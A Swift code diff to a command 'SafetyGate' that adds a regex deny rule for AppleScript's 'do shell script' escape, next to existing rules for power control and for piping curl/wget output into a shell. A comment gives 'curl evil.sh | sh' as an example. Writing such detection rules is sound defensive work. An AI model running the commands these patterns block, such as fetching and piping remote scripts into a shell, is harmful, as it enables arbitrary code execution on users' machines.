@@ -58,6 +58,10 @@ public struct SafetyGate: Sendable {
         (#"(?i)\b(shutdown|reboot|halt|poweroff)\b"#, "power/session control"),
         (#"(?i)\bpmset\s+(sleep|restart|shutdown)"#, "power/session control"),
         (#"(?i)osascript.*(shut\s*down|restart|log\s*out|sleep)"#, "power/session control"),
+        // AppleScript's shell escape — typed into Script Editor/Automator
+        // (not "terminals", so the terminal list never sees it) it runs
+        // arbitrary shell as that app.
+        (#"(?i)\bdo\s+shell\s+script\b"#, "AppleScript shell escape"),
         // Remote code execution — `curl evil.sh | sh` is the classic
         // supply-chain footgun; a fetched script is never safe to run blind.
         (#"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b"#, "remote script piped to shell"),
